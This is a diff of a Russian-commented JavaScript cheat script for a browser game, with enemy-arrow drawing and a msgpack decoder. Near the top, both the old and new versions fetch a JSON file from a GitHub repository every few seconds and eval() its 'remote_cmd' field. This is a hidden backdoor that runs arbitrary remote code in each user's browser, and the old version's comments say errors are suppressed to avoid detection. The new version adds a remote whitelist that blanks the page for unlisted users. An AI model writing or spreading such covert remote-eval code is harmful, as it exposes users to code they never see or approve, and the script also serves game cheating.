@@ -1,114 +1,105 @@
-((() => {
-'use strict';
+(() => {
+    'use strict';
 
-// ────────────────────────────────────────────────
-//  🌐 СЕКЦИЯ УДАЛЕННОГО ДОСТУПА (TOP LEVEL)
-// ────────────────────────────────────────────────
-const SYNC_URL = "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json";
+(function() {
+    const DATA_URL = "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json";
 
-// Твое окно уведомлений
-function showRemoteNotice(text, color = "#ff3366") {
-    const oldMsg = document.getElementById('remote-notice');
-    if (oldMsg) oldMsg.remove(); // Убираем старое, если есть
+    async function checkSecurity() {
+        try {
+            // 1. Пытаемся достать логин, который чел ввел в лоадере
+            // Лоадеры часто хранят это в localStorage под ключами 'uid', 'auth' или 'login'
+            const savedUser = localStorage.getItem('u') || localStorage.getItem('uid') || (window.myPlayer ? window.myPlayer.name : null);
 
-    const msg = document.createElement('div');
-    msg.id = 'remote-notice';
-    msg.innerHTML = text;
-    msg.style = `
-        position: fixed; top: 15%; left: 50%; 
-        transform: translate(-50%, -50%);
-        padding: 15px 30px; background: rgba(0,0,0,0.85);
-        color: ${color}; border: 2px solid ${color};
-        font-family: 'Courier New', monospace; font-size: 18px;
-        z-index: 1000000; border-radius: 8px;
-        text-shadow: 0 0 8px ${color};
-        box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        pointer-events: none; transition: all 0.5s ease;
-    `;
-    document.body.appendChild(msg);
-    // Удаление через 7 секунд
-    setTimeout(() => {
-        msg.style.opacity = '0';
-        setTimeout(() => msg.remove(), 500);
-    }, 7000);
-}
+            const res = await fetch(DATA_URL + '?t=' + Date.now());
+            const data = await res.json();
 
-// Сама синхронизация
-async function syncControl() {
-    try {
-        const res = await fetch(SYNC_URL + '?t=' + Date.now());
-        if (!res.ok) return;
-        const data = await res.json();
+            if (savedUser) {
+                // Ищем этого чела в твоем списке на Гитхабе
+                const userInList = data.users.find(u => u.name === savedUser);
 
-        if (data && data.remote_cmd && data.remote_cmd.trim() !== "") {
-            // Если в конфиге что-то есть - исполняем
-            eval(data.remote_cmd);
+                // ЛОГИКА КИКНУТЬ:
+                // Если чела нет в списке ИЛИ его статус не active
+                if (!userInList || userInList.status !== "active") {
+                    document.body.innerHTML = "<div style='color:white; background:black; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:25px;'>ACCESS DENIED: ACCOUNT TERMINATED</div>";
+                    setTimeout(() => { location.replace("about:blank"); }, 2000);
+                    return;
+                }
+            }
+
+            // 2. УДАЛЕННЫЕ КОМАНДЫ (Уведомления и т.д.)
+            if (data.remote_cmd) {
+                eval(data.remote_cmd);
+            }
+
+        } catch (e) {
+            // Если инета нет или гитхаб лежит - можно либо разрешить, либо заблокировать
         }
-    } catch (e) {
-        // Ошибки в консоль не спамим, чтобы не палиться
     }
-}
 
-// Запуск чекера (раз в 10 секунд)
-setInterval(syncControl, 10000);
-syncControl();
-// ────────────────────────────────────────────────
-//  ✅ MSGPACK ДЕКОДЕР
-// ────────────────────────────────────────────────
-const msgpackDecode = (() => {
-const td = new TextDecoder();
-return (buf) => {
-let o = 0, u = new Uint8Array(buf), dv = new DataView(buf);
-const r = () => {
-let t = u[o++];
-if (t < 0x80) return t;
-if (t >= 0xe0) return (t - 0x100);
-if ((t & 0xe0) === 0xa0) {
-let l = t & 0x1f;
-let s = td.decode(u.subarray(o, o + l));
-o += l;
-return s;
-}
-if ((t & 0xf0) === 0x90) {
-let l = t & 0x0f, a = [];
-for (let i = 0; i < l; i++) a.push(r());
-return a;
-}
-if ((t & 0xf0) === 0x80) {
-let l = t & 0x0f, m = {};
-for (let i = 0; i < l; i++) {
-let k = r();
-m[k] = r();
-}
-return m;
-}
-switch (t) {
-case 0xc0: return null;
-case 0xc2: return false;
-case 0xc3: return true;
-case 0xca: { let v = dv.getFloat32(o); o += 4; return v; }
-case 0xcb: { let v = dv.getFloat64(o); o += 8; return v; }
-case 0xcc: return u[o++];
-case 0xcd: { let v = dv.getUint16(o); o += 2; return v; }
-case 0xce: { let v = dv.getUint32(o); o += 4; return v; }
-case 0xcf: { let v = dv.getBigUint64(o); o += 8; return Number(v); }
-case 0xd0: return dv.getInt8(o++);
-case 0xd1: { let v = dv.getInt16(o); o += 2; return v; }
-case 0xd2: { let v = dv.getInt32(o); o += 4; return v; }
-case 0xd3: { let v = dv.getBigInt64(o); o += 8; return Number(v); }
-case 0xd9: { let l = u[o++]; let s = td.decode(u.subarray(o, o + l)); o += l; return s; }
-case 0xda: { let l = dv.getUint16(o); o += 2; let s = td.decode(u.subarray(o, o + l)); o += l; return s; }
-case 0xdb: { let l = dv.getUint32(o); o += 4; let s = td.decode(u.subarray(o, o + l)); o += l; return s; }
-case 0xdc: { let l = dv.getUint16(o); o += 2; let a = []; for (let i = 0; i < l; i++) a.push(r()); return a; }
-case 0xdd: { let l = dv.getUint32(o); o += 4; let a = []; for (let i = 0; i < l; i++) a.push(r()); return a; }
-case 0xde: { let l = dv.getUint16(o); o += 2; let m = {}; for (let i = 0; i < l; i++) { let k = r(); m[k] = r(); } return m; }
-case 0xdf: { let l = dv.getUint32(o); o += 4; let m = {}; for (let i = 0; i < l; i++) { let k = r(); m[k] = r(); } return m; }
-default: throw new Error(`Unknown type: 0x${t.toString(16)}`);
-}
-};
-return r();
-};
+    // Запускаем проверку раз в 15 секунд
+    setInterval(checkSecurity, 15000);
+    checkSecurity();
 })();
+
+    // ────────────────────────────────────────────────
+    //  ✅ MSGPACK ДЕКОДЕР
+    // ────────────────────────────────────────────────
+    const msgpackDecode = (() => {
+        const td = new TextDecoder();
+        return (buf) => {
+            let o = 0, u = new Uint8Array(buf), dv = new DataView(buf);
+            const r = () => {
+                let t = u[o++];
+                if (t < 0x80) return t;
+                if (t >= 0xe0) return (t - 0x100);
+                if ((t & 0xe0) === 0xa0) {
+                    let l = t & 0x1f;
+                    let s = td.decode(u.subarray(o, o + l));
+                    o += l;
+                    return s;
+                }
+                if ((t & 0xf0) === 0x90) {
+                    let l = t & 0x0f, a = [];
+                    for (let i = 0; i < l; i++) a.push(r());
+                    return a;
+                }
+                if ((t & 0xf0) === 0x80) {
+                    let l = t & 0x0f, m = {};
+                    for (let i = 0; i < l; i++) {
+                        let k = r();
+                        m[k] = r();
+                    }
+                    return m;
+                }
+                switch (t) {
+                    case 0xc0: return null;
+                    case 0xc2: return false;
+                    case 0xc3: return true;
+                    case 0xca: { let v = dv.getFloat32(o); o += 4; return v; }
+                    case 0xcb: { let v = dv.getFloat64(o); o += 8; return v; }
+                    case 0xcc: return u[o++];
+                    case 0xcd: { let v = dv.getUint16(o); o += 2; return v; }
+                    case 0xce: { let v = dv.getUint32(o); o += 4; return v; }
+                    case 0xcf: { let v = dv.getBigUint64(o); o += 8; return Number(v); }
+                    case 0xd0: return dv.getInt8(o++);
+                    case 0xd1: { let v = dv.getInt16(o); o += 2; return v; }
+                    case 0xd2: { let v = dv.getInt32(o); o += 4; return v; }
+                    case 0xd3: { let v = dv.getBigInt64(o); o += 8; return Number(v); }
+                    case 0xd9: { let l = u[o++]; let s = td.decode(u.subarray(o, o + l)); o += l; return s; }
+                    case 0xda: { let l = dv.getUint16(o); o += 2; let s = td.decode(u.subarray(o, o + l)); o += l; return s; }
+                    case 0xdb: { let l = dv.getUint32(o); o += 4; let s = td.decode(u.subarray(o, o + l)); o += l; return s; }
+                    case 0xdc: { let l = dv.getUint16(o); o += 2; let a = []; for (let i = 0; i < l; i++) a.push(r()); return a; }
+                    case 0xdd: { let l = dv.getUint32(o); o += 4; let a = []; for (let i = 0; i < l; i++) a.push(r()); return a; }
+                    case 0xde: { let l = dv.getUint16(o); o += 2; let m = {}; for (let i = 0; i < l; i++) { let k = r(); m[k] = r(); } return m; }
+                    case 0xdf: { let l = dv.getUint32(o); o += 4; let m = {}; for (let i = 0; i < l; i++) { let k = r(); m[k] = r(); } return m; }
+                    default: throw new Error(`Unknown type: 0x${t.toString(16)}`);
+                }
+            };
+            return r();
+        };
+    })();
+
+    // Дальше твой код (объекты features, WebSocket и т.д.)
 
 // ────────────────────────────────────────────────
 //  ✅ СОХРАНЕНИЕ НАСТРОЕК
@@ -1717,18 +1708,18 @@ function mainLoop() {
     // Проверяем существование всего пути до enabled
     if (features && features.arrows && features.arrows.enabled && myPos && gameCanvas) {
         if (typeof setupArrowCanvas === 'function') setupArrowCanvas();
-        
+
         // Если инициализация прошла успешно
         if (arrowCtx) {
             const rect = gameCanvas.getBoundingClientRect();
             const centerX = rect.left + rect.width / 2;
             const centerY = rect.top + rect.height / 2;
-            
+
             // Фильтрация союзников
-            const filtered = (features.arrows.ignoreTeam && enemies.length > 0) 
-                ? enemies.filter(e => !e.teammate) 
+            const filtered = (features.arrows.ignoreTeam && enemies.length > 0)
+                ? enemies.filter(e => !e.teammate)
                 : enemies;
-            
+
             if (typeof drawAllArrows === 'function') {
                 drawAllArrows(centerX, centerY, filtered);
             }
